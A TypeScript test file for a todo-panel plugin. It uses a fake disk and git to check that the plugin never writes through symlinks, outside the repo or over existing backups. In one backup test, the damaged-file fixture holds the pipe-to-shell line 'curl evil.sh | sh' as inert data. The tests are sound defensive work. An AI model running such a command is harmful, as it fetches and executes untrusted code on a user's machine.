// Engine cases through the fake engine, split from register.test.tsx (UCR 143) so no test file passes the runner limit.
// One responsibility, the end-to-end cases of the block named by the comment below.

import { expect, mock, test } from 'claude-code/testing'

// Batch G1 (UCR loop 1): repo roots from a subfolder, separate git dirs, outside a repo, Windows env,
// platform signs, the folder cut, folders made later, book backups, and Consolidate's untrusted sources.
{
const PANE = { component: 'Pane', requestId: 'claudeopticon', props: { title: 'Claudeopticon', isFocused: false, bodyColumns: 60, placement: 'dock' } } as never as { component: 'Pane'; requestId: string; props: never }

type Test = Parameters<Parameters<typeof test>[1]>[0]
type On = Parameters<Parameters<typeof test>[1]>[1]

const open = async ($: Test) => {
  await $.command.run({ command: 'claudeopticon', args: '' } as never).catch(() => undefined)

  return $.ui.mount({ plugin: 'claudeopticon', surface: 'desktop', ...PANE })
}
const settle = async () => {
  for (let i = 0; i < 20; i += 1) {
    await new Promise(resolve => setTimeout(resolve, 5))
  }
}

const THREE = ['todo-consolidate', 'todo-delete-empty', 'todo-delete-dup-tickets']
const segs = (path: string) => path.split('/').filter(part => part !== '')
/** A path made absolute against `base`, with `.` and `..` folded (a copy of the mod's resolveAgainst, so this block owns its fakes). */
function resolveIn(base: string, path: string): string {
  const parts = (path.startsWith('/') || /^[A-Za-z]:\//.test(path) ? path : `${base}/${path}`).split('/')
  const out: string[] = []
  for (const part of parts.slice(1)) {
    if (part === '..') {
      out.pop()
    } else if (part !== '' && part !== '.') {
      out.push(part)
    }
  }

  return `${parts[0]}/${out.join('/')}`
}

type G1Opts = {
  root?: string
  cwd: string
  listed?: string[]
  noGit?: boolean
  rev?: string
  worktrees?: string
  gitDirs?: string[]
  home?: string | null
  env?: Record<string, string>
  printenvMissing?: boolean
  psEnv?: Record<string, string>
  uname?: string
  present?: string[]
  links?: Record<string, string>
  dangling?: string[]
  hidden?: Set<string>
  toasts?: string[]
}

/**
 * A fake disk and git with a session folder (`cwd`). The test engine hands a relative path over made
 * absolute against its own folder; the fake reads such a path back as relative and resolves it against
 * `cwd`, so `.`, `.claude_todo` and `../.claude_todo` land where a real session would put them. `links`
 * maps a path (or a folder above it) to its real path; `hidden` holds folders that do not exist until
 * the test removes them from the set; `present` names other paths that exist (such as /usr/bin/osascript).
 * `env` and `psEnv` are what printenv and PowerShell give per variable.
 */
function g1Repo(on: On, files: Record<string, string>, opts: G1Opts) {
  const R = opts.root ?? opts.cwd
  const writes: string[] = []
  const realWrites: string[] = []
  const calls: string[] = []
  const lsCwds: string[] = []
  const links = opts.links ?? {}
  // The first folder names the test's own paths use: a path under any other is one the engine made absolute against its own folder.
  const own = new Set([R, opts.cwd, ...Object.keys(files), ...Object.keys(links), ...Object.values(links), ...(opts.present ?? []), ...(opts.gitDirs ?? []), ...Object.values(opts.env ?? {}), ...(typeof opts.home === 'string' ? [opts.home] : []), '/home/a', '/usr/bin'].map(path => segs(path)[0] ?? ''))
  let harness: string | undefined
  const map = (path: string) => {
    const parts = segs(path)
    if (/^[A-Za-z]:\//.test(path) || own.has(parts[0] ?? '')) {
      return path
    }
    if (harness === undefined && path.endsWith('/.claude_todo')) {
      harness = path.slice(0, -'/.claude_todo'.length)
    }
    if (harness === undefined) {
      return path
    }
    const h = segs(harness)
    let k = 0
    while (k < h.length && k < parts.length && h[k] === parts[k]) {
      k += 1
    }

    return resolveIn(opts.cwd, [...Array.from({ length: h.length - k }, () => '..'), ...parts.slice(k)].join('/') || '.')
  }
  const gitDirs = new Set(opts.noGit === true ? [] : (opts.gitDirs ?? [`${R}/.git`]))
  const isHidden = (path: string) => [...(opts.hidden ?? [])].some(dir => path === dir || path.startsWith(`${dir}/`))
  const linkOf = (path: string) => Object.keys(links).filter(key => path === key || path.startsWith(`${key}/`)).sort((a, b) => b.length - a.length)[0]
  const realOf = (path: string) => {
    const key = linkOf(path)

    return key === undefined ? path : `${links[key]}${path.slice(key.length)}`
  }
  // UCR-150 (batch K1): the session folder exists, so the real path of `.` (the engine's own folder, read back as `cwd`) resolves.
  const exists = (path: string) => !isHidden(path) && (path in files || Object.keys(files).some(key => key.startsWith(`${path}/`)) || gitDirs.has(path) || (opts.present ?? []).includes(path) || path === opts.cwd)
  const named = (dir: string) => {
    const names = new Set<string>()
    for (const key of [...Object.keys(files).filter(one => one in files && !isHidden(one)), ...(opts.dangling ?? [])]) {
      if (key.startsWith(`${dir}/`) && !key.slice(dir.length + 1).includes('/')) {
        names.add(key.slice(dir.length + 1))
      }
    }

    return [...names]
  }
  on('process.run', (_$, e) => {
    const { argv, init } = e as unknown as { argv: string[]; init?: { cwd?: string } }
    calls.push(argv.join(' '))
    const out = (stdout: string, exitCode = 0) => ({ value: { exitCode, stdout, stderr: '' } }) as never
    if (argv[0] === 'printenv') {
      if (opts.printenvMissing === true) {
        throw new Error('spawn printenv ENOENT')
      }
      const value = argv[1] === 'HOME' ? (opts.home === undefined ? '/home/a' : opts.home) : opts.env?.[argv[1]!]

      return value === null || value === undefined ? out('', 1) : out(`${value}\n`)
    }
    if (argv[0] === 'powershell.exe' && argv[argv.length - 1]!.includes('GetEnvironmentVariable')) {
      if (opts.psEnv === undefined) {
        throw new Error('spawn powershell.exe ENOENT')
      }

      return out(`${opts.psEnv[/GetEnvironmentVariable\('(\w+)'\)/.exec(argv[argv.length - 1]!)![1]!] ?? ''}\n`)
    }
    if (argv[0] === 'uname') {
      return out(`${opts.uname ?? 'Darwin'}\n`)
    }
    if (argv[0] === 'git') {
      if (opts.noGit === true) {
        return out('', 128)
      }
      if (argv[1] === 'rev-parse') {
        const prefix = opts.cwd === R ? '' : `${opts.cwd.slice(R.length + 1)}/`
        const depth = segs(prefix).length

        return out(opts.rev ?? (depth === 0 ? `${R}\n.git\n.git\n\n` : `${R}\n${R}/.git\n${'../'.repeat(depth)}.git\n${prefix}\n`))
      }
      if (argv[1] === 'worktree') {
        return out(opts.worktrees ?? `worktree ${R}\nHEAD a\nbranch refs/heads/main\n`)
      }
      if (argv[1] === 'ls-files') {
        lsCwds.push(init?.cwd ?? '')

        return out(argv.includes('--directory') ? '' : (opts.listed ?? []).join('\0'))
      }
    }
    if (['open', 'xdg-open', 'mkdir'].includes(argv[0]!)) {
      return out('')
    }

    return out('', 1)
  })
  on('fs.exists', (_$, e) => ({ value: exists(map(e.path)) }))
  on('fs.stat', (_$, e) => {
    const path = map(e.path)
    if (!exists(path) && links[path] === undefined) {
      throw new Error('ENOENT')
    }

    return { value: { kind: path in files ? 'file' : 'dir', size: 0, mtimeMs: 1, isLink: links[path] !== undefined, realPath: realOf(path) } } as never
  })
  on('fs.list', (_$, e) => ({ value: named(map(e.path)).map(name => ({ name, kind: 'file', size: 1, mtimeMs: 2 + writes.length, isLink: false })) }))
  on('fs.read', (_$, e) => {
    const path = map(e.path)
    if (!exists(path)) {
      throw new Error('ENOENT')
    }

    return { value: files[path] ?? '' }
  })
  on('fs.write', (_$, e) => {
    const path = map(e.path)
    writes.push(path)
    realWrites.push(realOf(path))
    files[path] = e.text as string

    return { value: undefined } as never
  })
  on('ui.toast', (_$, e) => {
    opts.toasts?.push(JSON.stringify(e))

    return { value: undefined } as never
  })
  on('agent.list', () => ({ value: [] }))
  // A working store: the archive move waits while its record cannot be read (G3, UCR-013).
  const kept = new Map<string, unknown>()
  on('store.get', (_$, e) => ({ value: kept.get(e.key) }) as never)
  on('store.set', (_$, e) => {
    kept.set(e.key, e.value)

    return { value: undefined } as never
  })

  return { writes, realWrites, calls, lsCwds }
}

/** A model that puts every item in one category, counting its calls. */
function sortModel(on: On, name = 'Billing') {
  const asked = { count: 0 }
  on('model.complete', () => {
    asked.count += 1
    // Every number a batch can hold: the reply assigns only the items the prompt listed.
    const assign = Object.fromEntries(Array.from({ length: 60 }, (_, i) => [String(i + 1), name]))

    return { value: { isAnswered: true, text: JSON.stringify({ categories: [name], assign }), usage: { input_tokens: 1, output_tokens: 1, cache_read_input_tokens: 0, cache_creation_input_tokens: 0 } } } as never
  })

  return asked
}

const yesToMoves = (on: On) =>
  on('tool.call', { tool: 'AskUserQuestion' }, (_$, e) => {
    const question = (e as unknown as { questions: { question: string }[] }).questions[0]!.question

    return { result: { questions: [], answers: { [question]: 'Move it' } } } as never
  })

// ---------------------------------------------------------------- UCR-085
// Property: the trust root and the central folder are the repo the session works in, wherever in
// it the session starts; a folder above that repo is never read or written.

const ROOT_STATES: [string, { root: string; cwd: string; above: string; gitDirs?: string[] }][] = [
  ['the session one folder down', { root: '/w/repo', cwd: '/w/repo/sub', above: '/w' }],
  ['the session two folders down', { root: '/a/b/repo', cwd: '/a/b/repo/sub/deep', above: '/a' }],
  ['a repo nested in another repo, the session in its subfolder', { root: '/outer/inner', cwd: '/outer/inner/sub', above: '/outer', gitDirs: ['/outer/inner/.git', '/outer/.git'] }],
]
for (const [name, state] of ROOT_STATES) {
  test(`UCR-085 ${name}: no folder above the repo is written, and the buttons are those of a plain repo`, async ($, on) => {
    const clock = mock.clock(on)
    const files: Record<string, string> = {
      [`${state.root}/.claude_todo/TODO.md`]: '- [ ] #T0001 one\n- [ ] root no id',
      [`${state.root}/mods/x/.claude_todo/T.md`]: '- [ ] #T0002 two',
      [`${state.above}/.claude_todo/TODO.md`]: '- [ ] above no id',
    }
    const fake = g1Repo(on, files, { root: state.root, cwd: state.cwd, listed: ['.claude_todo/TODO.md', 'mods/x/.claude_todo/T.md'], ...(state.gitDirs === undefined ? {} : { gitDirs: state.gitDirs }) })
    const ui = await open($)
    await clock.advance(15000)
    expect(fake.writes.filter(path => !path.startsWith(`${state.root}/`))).toEqual([])
    expect(files[`${state.above}/.claude_todo/TODO.md`]).toBe('- [ ] above no id')
    expect(fake.lsCwds.length).toBeGreaterThan(0)
    expect(fake.lsCwds.every(cwd => cwd === state.root)).toBe(true)
    expect(files[`${state.root}/.claude_todo/TODO.md`]).toMatch(/#T\w+ root no id/)
    expect(await ui.find({ key: 'todo-consolidate' })).toBeDefined()
  })
}

test('UCR-085 a linked worktree started in a subfolder is still a worktree: the buttons stay off', async ($, on) => {
  mock.clock(on)
  const files: Record<string, string> = { '/main/.claude_todo/TODO.md': '- [ ] #T1 one', '/main/mods/x/.claude_todo/T.md': '- [ ] #T2 two', '/main/mods/y/.claude_todo/E.md': '' }
  g1Repo(on, files, { root: '/wt', cwd: '/wt/src', rev: '/wt\n/main/.git/worktrees/wt\n/main/.git\nsrc/\n', worktrees: 'worktree /main\nHEAD a\n\nworktree /wt\nHEAD b\n', gitDirs: ['/wt/.git', '/main/.git'], listed: ['.claude_todo/TODO.md', 'mods/x/.claude_todo/T.md', 'mods/y/.claude_todo/E.md'] })
  const ui = await open($)
  await settle()
  for (const key of THREE) {
    expect(await ui.find({ key })).toBeUndefined()
  }
})

// ---------------------------------------------------------------- UCR-057
// Property: in a linked worktree of a separate-git-dir repo, the worktree's own folder stays
// writable (numbered, marked) and the tidy buttons stay off; the git dir is never the main checkout.

test('UCR-057 a worktree of a separate-git-dir repo: its own folder is numbered and marked, and the buttons are off', async ($, on) => {
  const clock = mock.clock(on)
  const toasts: string[] = []
  const TODO = '/sepwt/.claude_todo/TODO.md'
  const files: Record<string, string> = { [TODO]: '- [ ] #T0001 one\n- [ ] no id yet', '/sepwt/.claude_todo/E.md': '' }
  g1Repo(on, files, { root: '/sepwt', cwd: '/sepwt', toasts, rev: '/sepwt\n/sep.git/worktrees/sepwt\n/sep.git\n\n', worktrees: 'worktree /sep.git\nHEAD a\nbranch refs/heads/master\n\nworktree /sepwt\nHEAD a\nbranch refs/heads/sepwt\n', listed: ['.claude_todo/TODO.md', '.claude_todo/E.md'] })
  const ui = await open($)
  await clock.advance(10000)
  expect(files[TODO]).toMatch(/#T\w+ no id yet/)
  await ui.press({ key: 'ticket-start-TODO.md-#t0001' })
  expect(files[TODO]).toContain('- [~] #T0001 one')
  expect(toasts.join('\n')).not.toContain('not safe')
  for (const key of THREE) {
    expect(await ui.find({ key })).toBeUndefined()
  }
})

// ---------------------------------------------------------------- UCR-073
// Property: outside a git repo the session folder's own .claude_todo is written like a repo's
// (Mark, move_ticket, the sorter, Show completed); never through a symlink, never the global folder,
// never with HOME unknown.

const WORK = '/work/.claude_todo'
const WORK_TODO = `${WORK}/TODO.md`
const WORK_TEXT = '- [ ] #T1 pay vendor\n- [ ] #T2 sign lease'

test('UCR-073 outside a repo, Mark, move_ticket, the sorter and Show completed write the session folder\'s own todo', async ($, on) => {
  mock.clock(on)
  const toasts: string[] = []
  const asked = sortModel(on)
  yesToMoves(on)
  const files: Record<string, string> = { [WORK_TODO]: WORK_TEXT, [`${WORK}/archive/TODO.md`]: '- [x] #T0 old' }
  g1Repo(on, files, { cwd: '/work', noGit: true, toasts })
  const ui = await open($)
  await settle()
  expect(asked.count).toBe(1)
  expect(JSON.parse(files[`${WORK}/categories.json`]!).categories).toEqual(['Billing'])
  expect(await ui.find({ key: 'todo-show-completed' })).toBeDefined()
  await ui.press({ key: 'ticket-start-TODO.md-#t1' })
  expect(files[WORK_TODO]).toContain('- [~] #T1 pay vendor')
  const answer = JSON.stringify(await $.tool.call({ tool: 'mcp__claudeopticon__move_ticket', item: '#T2', to: 'in_progress', reason: 'x' } as never))
  expect(answer).not.toContain('not safe')
  expect(files[WORK_TODO]).toContain('- [~] #T2 sign lease')
  expect(toasts.join('\n')).not.toContain('not safe')
})

const LOOSE_STATES: [string, { cwd: string; links?: Record<string, string>; home?: string | null }][] = [
  ['the session folder\'s .claude_todo is a symlink', { cwd: '/work', links: { [WORK]: '/elsewhere/x/.claude_todo' } }],
  ['the session folder is the home .claude folder (the global todo)', { cwd: '/home/a/.claude' }],
  ['HOME cannot be read', { cwd: '/work', home: null }],
]
for (const [name, state] of LOOSE_STATES) {
  test(`UCR-073 outside a repo, ${name}: nothing is written`, async ($, on) => {
    mock.clock(on)
    const asked = sortModel(on)
    yesToMoves(on)
    const folder = `${state.cwd}/.claude_todo`
    const files: Record<string, string> = { [`${folder}/TODO.md`]: '- [ ] #T1 pay vendor\n- [ ] no id yet\n- [x] #T3 shipped' }
    const before = { ...files }
    const fake = g1Repo(on, files, { cwd: state.cwd, noGit: true, ...(state.links === undefined ? {} : { links: state.links }), ...(state.home === undefined ? {} : { home: state.home }) })
    const ui = await open($)
    await settle()
    await ui.press({ key: 'ticket-start-TODO.md-#t1' }).catch(() => undefined)
    await $.tool.call({ tool: 'mcp__claudeopticon__move_ticket', item: '#T1', to: 'done', reason: 'x' } as never).catch(() => undefined)
    expect(fake.writes).toEqual([])
    expect(files).toEqual(before)
    expect(asked.count).toBe(0)
  })
}

// ---------------------------------------------------------------- UCR-065
// Property: a todo folder made during the session is numbered and archived like one found at start;
// one made as a symlink is not written.

const LATE_STATES: [string, { cwd: string; folder: string; links?: Record<string, string>; isWritten: boolean }][] = [
  ['in the session folder, at the repo root', { cwd: '/repo', folder: '/repo/.claude_todo', isWritten: true }],
  ['at the repo root, the session in a subfolder (the top of the walk)', { cwd: '/repo/sub', folder: '/repo/.claude_todo', isWritten: true }],
  ['as a symlink to a folder outside the repo', { cwd: '/repo', folder: '/repo/.claude_todo', links: { '/repo/.claude_todo': '/elsewhere/x/.claude_todo' }, isWritten: false }],
]
for (const [name, state] of LATE_STATES) {
  test(`UCR-065 a folder made later ${name}: ${state.isWritten ? 'numbered and archived' : 'never written'}`, async ($, on) => {
    const clock = mock.clock(on)
    const hidden = new Set([state.folder])
    const files: Record<string, string> = { [`${state.folder}/TODO.md`]: '- [ ] Fix x\n- [x] #T5 Done thing' }
    const fake = g1Repo(on, files, { root: '/repo', cwd: state.cwd, hidden, listed: [], ...(state.links === undefined ? {} : { links: state.links }) })
    await open($)
    await clock.advance(4000)
    hidden.clear()
    for (let i = 0; i < 6; i += 1) {
      await clock.advance(4000)
    }
    if (state.isWritten) {
      expect(files[`${state.folder}/TODO.md`]).toMatch(/^- \[ \] #T\w+ Fix x/)
      expect(files[`${state.folder}/TODO.md`]).not.toContain('Done thing')
      expect(files[`${state.folder}/archive/TODO.md`]).toContain('#T5 Done thing')
    } else {
      expect(fake.writes).toEqual([])
    }
  })
}

// ---------------------------------------------------------------- UCR-059
// Property: a folder found during the session when 20 already show is never dropped in silence: the
// cut is toasted, and the ticket IDs of the folder cut still count.

const LIMIT = Array.from({ length: 20 }, (_, i) => `d${String(i).padStart(2, '0')}/.claude_todo`)

const LATER_CUT_STATES: [string, { cwd: string; newFolder: string; ids: Record<string, string>; listed: string[] }][] = [
  [
    'the session folder\'s own, made later: it shows, and the last folder is cut',
    { cwd: '/repo', newFolder: '/repo/.claude_todo', ids: { '/repo/.claude_todo/TODO.md': '- [ ] #T0002 made in the session', '/repo/d19/.claude_todo/TODO.md': '- [ ] #T0003 last of twenty' }, listed: LIMIT },
  ],
  [
    'the session folder\'s own, its ID in its archive (the edge of what a folder holds)',
    { cwd: '/repo', newFolder: '/repo/.claude_todo', ids: { '/repo/.claude_todo/archive/TODO.md': '- [x] #T0002 archived in it', '/repo/d19/.claude_todo/archive/OLD.md': '- [x] #T0003 archived in the last' }, listed: LIMIT },
  ],
  [
    'a closer folder when a primary already shows: the new one is cut',
    { cwd: '/repo/sub', newFolder: '/repo/sub/.claude_todo', ids: { '/repo/sub/.claude_todo/TODO.md': '- [ ] #T0002 in the closer folder', '/repo/.claude_todo/TODO.md': '- [ ] #T0003 in the primary' }, listed: ['.claude_todo/TODO.md', ...LIMIT.slice(0, 19)] },
  ],
]
for (const [name, state] of LATER_CUT_STATES) {
  test(`UCR-059 at 20 folders, ${name}: the cut is toasted and no ID is given twice`, async ($, on) => {
    const clock = mock.clock(on)
    const toasts: string[] = []
    const hidden = new Set([state.newFolder])
    const files: Record<string, string> = { ...state.ids }
    for (const rel of LIMIT) {
      files[`/repo/${rel}/TODO.md`] ??= '- [ ] #T0001 filler'
    }
    files['/repo/.claude_todo/TODO.md'] ??= '- [ ] #T0001 filler'
    g1Repo(on, files, { root: '/repo', cwd: state.cwd, hidden, toasts, listed: state.listed.map(rel => `${rel}/TODO.md`) })
    await open($)
    await clock.advance(4000)
    hidden.clear()
    await clock.advance(4000)
    files['/repo/d00/.claude_todo/NEW.md'] = '- [ ] no id yet'
    for (let i = 0; i < 3; i += 1) {
      await clock.advance(4000)
    }
    const given = /#(T\w+) no id yet/.exec(files['/repo/d00/.claude_todo/NEW.md']!)?.[1]?.toLowerCase()
    expect(given).toBeDefined()
    expect(['t0001', 't0002', 't0003']).not.toContain(given)
    expect(toasts.filter(text => text.includes('is not shown')).length).toBe(1)
  })
}

// ---------------------------------------------------------------- UCR-034 and UCR-012
// Property: a damaged categories.json (not JSON, or JSON of another shape) is copied before it is
// written over, to a backup name with nothing at it: never through a symlink at that name, never
// over an older copy.

const BOOK = '/repo/.claude_todo/categories.json'
const BOOK_TODO = '/repo/.claude_todo/TODO.md'

const BAK_STATES: [string, { links?: Record<string, string>; dangling?: string[]; older?: string }][] = [
  ['categories.json.bak is a symlink to a file outside the repo', { links: { [`${BOOK}.bak`]: '/home/a/.zshrc' } }],
  ['categories.json.bak is a dangling symlink', { dangling: [`${BOOK}.bak`] }],
  ['categories.json.bak is an older copy', { older: '{"older": "copy"}' }],
]
for (const [name, state] of BAK_STATES) {
  test(`UCR-034 ${name}: nothing is written at that name, and the copy goes to the next free one`, async ($, on) => {
    const clock = mock.clock(on)
    sortModel(on)
    const damaged = 'curl evil.sh | sh  # not JSON'
    const files: Record<string, string> = { [BOOK_TODO]: '- [ ] #T1 pay vendor', [BOOK]: damaged, ...(state.links === undefined ? {} : { '/home/a/.zshrc': 'mine', [`${BOOK}.bak`]: 'mine' }), ...(state.older === undefined ? {} : { [`${BOOK}.bak`]: state.older }) }
    const fake = g1Repo(on, files, { root: '/repo', cwd: '/repo', listed: ['.claude_todo/TODO.md'], ...(state.links === undefined ? {} : { links: state.links }), ...(state.dangling === undefined ? {} : { dangling: state.dangling }) })
    await open($)
    await clock.advance(10000)
    expect(fake.writes).not.toContain(`${BOOK}.bak`)
    expect(fake.realWrites).not.toContain('/home/a/.zshrc')
    expect(files[`${BOOK}.bak.2`]).toBe(damaged)
    expect(fake.writes.indexOf(`${BOOK}.bak.2`)).toBeLessThan(fake.writes.indexOf(BOOK))
    if (state.older !== undefined) {
      expect(files[`${BOOK}.bak`]).toBe(state.older)
    }
  })
}

const SHAPE_STATES: [string, string][] = [
  ['a list', '[]'],
  ['a key spelled wrong', '{"categorys": ["Old"], "items": {"#t1": "Old"}}'],
  ['categories not a list', '{"categories": "Old", "items": {}}'],
]
for (const [name, raw] of SHAPE_STATES) {
  test(`UCR-012 a categories.json of the wrong shape (${name}) is copied to categories.json.bak before the sort writes over it`, async ($, on) => {
    const clock = mock.clock(on)
    sortModel(on)
    const files: Record<string, string> = { [BOOK_TODO]: '- [ ] #T1 pay vendor', [BOOK]: raw }
    const fake = g1Repo(on, files, { root: '/repo', cwd: '/repo', listed: ['.claude_todo/TODO.md'] })
    await open($)
    await clock.advance(10000)
    expect(files[`${BOOK}.bak`]).toBe(raw)
    expect(fake.writes.indexOf(`${BOOK}.bak`)).toBeLessThan(fake.writes.indexOf(BOOK))
    expect(JSON.parse(files[BOOK]!).categories).toEqual(['Billing'])
  })
}

test('UCR-012 every backup name taken: the damaged book is left as it is, nothing is sorted, and a toast says so once', async ($, on) => {
  const clock = mock.clock(on)
  const asked = sortModel(on)
  const toasts: string[] = []
  const files: Record<string, string> = { [BOOK_TODO]: '- [ ] #T1 pay vendor', [BOOK]: '[]', [`${BOOK}.bak`]: 'old 1' }
  for (let i = 2; i <= 10; i += 1) {
    files[`${BOOK}.bak.${i}`] = `old ${i}`
  }
  const before = { ...files }
  const fake = g1Repo(on, files, { root: '/repo', cwd: '/repo', toasts, listed: ['.claude_todo/TODO.md'] })
  await open($)
  await clock.advance(20000)
  expect(fake.writes.filter(path => path.includes('categories'))).toEqual([])
  expect(files).toEqual(before)
  expect(asked.count).toBe(0)
  expect(toasts.filter(text => text.includes('backup names are taken')).length).toBe(1)
})

// ---------------------------------------------------------------- UCR-086 (replaces the UCR-034 case "the folder holding the book is a symlink")
// The old case read no items, so it passed on code with no check. Here the items read through the
// symlinked folder, so a sorter with no check would call the model and write the book.

test('UCR-086 the folder holding the book is a symlink, its items readable: the sorter calls no model and writes nothing', async ($, on) => {
  mock.clock(on)
  const asked = sortModel(on)
  const files: Record<string, string> = { [BOOK_TODO]: '- [ ] #T1 pay vendor\n- [ ] #T2 sign lease' }
  const fake = g1Repo(on, files, { root: '/repo', cwd: '/repo', listed: ['.claude_todo/TODO.md'], links: { '/repo/.claude_todo': '/home/a/elsewhere/.claude_todo' } })
  const ui = await open($)
  await settle()
  expect(JSON.stringify(await ui.findAll({}))).toContain('pay vendor')
  expect(asked.count).toBe(0)
  expect(fake.writes.filter(path => path.includes('categories'))).toEqual([])
})

// ---------------------------------------------------------------- UCR-019
// Property: a Consolidate source folder that is not trusted (a symlink at it or above it) is named in
// a toast, not dropped in silence; a trusted source beside it still moves.

const SOURCE_STATES: [string, { links: Record<string, string>; good: boolean; bad: string }][] = [
  ['the only source folder is a symlink', { links: { '/repo/mods/x/.claude_todo': '/elsewhere/x/.claude_todo' }, good: false, bad: '/repo/mods/x/.claude_todo' }],
  ['a symlinked source beside a good one', { links: { '/repo/mods/x/.claude_todo': '/elsewhere/x/.claude_todo' }, good: true, bad: '/repo/mods/x/.claude_todo' }],
  ['a source whose parent folder is a symlink', { links: { '/repo/mods': '/elsewhere/mods' }, good: false, bad: '/repo/mods/x/.claude_todo' }],
]
for (const [name, state] of SOURCE_STATES) {
  test(`UCR-019 Consolidate, ${name}: the untrusted source is named and left as it is`, async ($, on) => {
    mock.clock(on)
    const toasts: string[] = []
    const files: Record<string, string> = { '/repo/.claude_todo/TODO.md': '- [ ] #T0001 central', '/repo/mods/x/.claude_todo/T.md': '- [ ] #T0002 linked away', ...(state.good ? { '/repo/lib/.claude_todo/L.md': '- [ ] #T0003 good source' } : {}) }
    g1Repo(on, files, { root: '/repo', cwd: '/repo', toasts, links: state.links, listed: ['.claude_todo/TODO.md', 'mods/x/.claude_todo/T.md', ...(state.good ? ['lib/.claude_todo/L.md'] : [])] })
    const ui = await open($)
    await settle()
    await ui.press({ key: 'todo-consolidate' })
    expect(toasts.join('\n')).toContain(`${state.bad} (not safe`)
    expect(files['/repo/mods/x/.claude_todo/T.md']).toBe('- [ ] #T0002 linked away')
    if (state.good) {
      expect(files['/repo/.claude_todo/TODO.md']).toContain('good source')
    }
  })
}

// ---------------------------------------------------------------- UCR-023 (Windows)
// Property: on Windows the HOME toast shows only when the mod really turns writes off, and a
// CLAUDE_CONFIG_DIR global folder is known, read through printenv or PowerShell.

test('UCR-023 on Windows with neither printenv nor PowerShell, no HOME toast, and the repo is still written', async ($, on) => {
  const clock = mock.clock(on)
  const toasts: string[] = []
  const files: Record<string, string> = { 'C:/repo/.claude_todo/TODO.md': '- [ ] #T0001 a\n- [ ] no id yet' }
  g1Repo(on, files, { root: 'C:/repo', cwd: 'C:/repo', printenvMissing: true, toasts, listed: ['.claude_todo/TODO.md'] })
  await open($)
  await clock.advance(10000)
  expect(toasts.filter(text => text.includes('HOME'))).toEqual([])
  expect(files['C:/repo/.claude_todo/TODO.md']).toMatch(/#T\w+ no id yet/)
})

const WIN_CONFIG_STATES: [string, Pick<G1Opts, 'printenvMissing' | 'psEnv' | 'env' | 'home'>][] = [
  ['through PowerShell, no printenv', { printenvMissing: true, psEnv: { USERPROFILE: 'C:\\Users\\me', CLAUDE_CONFIG_DIR: 'D:\\cfg' } }],
  ['through printenv, a lower-case drive and a trailing backslash', { home: 'C:\\Users\\me', env: { CLAUDE_CONFIG_DIR: 'd:\\Cfg\\' } }],
  ['through printenv in MSYS form', { home: '/c/Users/0me', env: { CLAUDE_CONFIG_DIR: '/d/cfg' } }],
]
for (const [name, state] of WIN_CONFIG_STATES) {
  test(`UCR-023 a Windows CLAUDE_CONFIG_DIR read ${name}: its todo folder is not written, and the buttons are off`, async ($, on) => {
    const clock = mock.clock(on)
    const files: Record<string, string> = { 'D:/cfg/.claude_todo/TODO.md': '- [x] #T1 Done parser\n- [ ] no id yet', 'D:/cfg/mods/x/.claude_todo/T.md': '- [ ] #T9 other' }
    const fake = g1Repo(on, files, { root: 'D:/cfg', cwd: 'D:/cfg', listed: ['.claude_todo/TODO.md', 'mods/x/.claude_todo/T.md'], ...state })
    const ui = await open($)
    await clock.advance(15000)
    expect(fake.writes.filter(path => path.startsWith('D:/cfg/.claude_todo'))).toEqual([])
    for (const key of THREE) {
      expect(await ui.find({ key })).toBeUndefined()
    }
  })
}

// ---------------------------------------------------------------- UCR-022
// Property: with no uname answer, a Mac is told by a file every macOS has, so Show completed opens
// with `open` and the trash runs the macOS commands, never xdg-open or the Linux ones.

const MAC_STATES: [string, string[]][] = [
  ['only /usr/bin/osascript is there', ['/usr/bin/osascript']],
  ['only /usr/bin/sw_vers is there', ['/usr/bin/sw_vers']],
  // H3 (UCR-022): the state 'only /usr/bin/trash is there' is gone. It asserted the wrong behavior:
  // trash-cli installs /usr/bin/trash on Linux. The H3 block at the end tests it as a Linux sign.
]
for (const [name, present] of MAC_STATES) {
  test(`UCR-022 no uname answer and ${name}: open and the macOS trash run, not xdg-open or gio`, async ($, on) => {
    mock.clock(on)
    const files: Record<string, string> = { '/repo/.claude_todo/TODO.md': '- [ ] #T1 open', '/repo/.claude_todo/archive/TODO.md': '- [x] #T0 old', '/repo/mods/x/.claude_todo/OLD.md': '' }
    const fake = g1Repo(on, files, { root: '/repo', cwd: '/repo', uname: '', present, listed: ['.claude_todo/TODO.md', 'mods/x/.claude_todo/OLD.md'] })
    const ui = await open($)
    await settle()
    await ui.press({ key: 'todo-show-completed' })
    await ui.press({ key: 'todo-delete-empty' })
    expect(fake.calls).toContain('open /repo/.claude_todo/archive/TODO.md')
    expect(fake.calls.some(call => call.startsWith('xdg-open'))).toBe(false)
    expect(fake.calls.some(call => call.startsWith('/usr/bin/trash '))).toBe(true)
    expect(fake.calls.some(call => call.startsWith('gio'))).toBe(false)
  })
}

test('UCR-022 no uname answer and no macOS file: the Linux opener, and the toast says the platform is unknown', async ($, on) => {
  mock.clock(on)
  const toasts: string[] = []
  const files: Record<string, string> = { '/repo/.claude_todo/TODO.md': '- [ ] #T1 open', '/repo/.claude_todo/archive/TODO.md': '- [x] #T0 old', '/repo/mods/x/.claude_todo/OLD.md': '' }
  const fake = g1Repo(on, files, { root: '/repo', cwd: '/repo', uname: '', toasts, listed: ['.claude_todo/TODO.md', 'mods/x/.claude_todo/OLD.md'] })
  const ui = await open($)
  await settle()
  await ui.press({ key: 'todo-show-completed' })
  await ui.press({ key: 'todo-delete-empty' })
  expect(fake.calls).toContain('xdg-open /repo/.claude_todo/archive/TODO.md')
  expect(toasts.join('\n')).toContain('platform unknown')
})
}
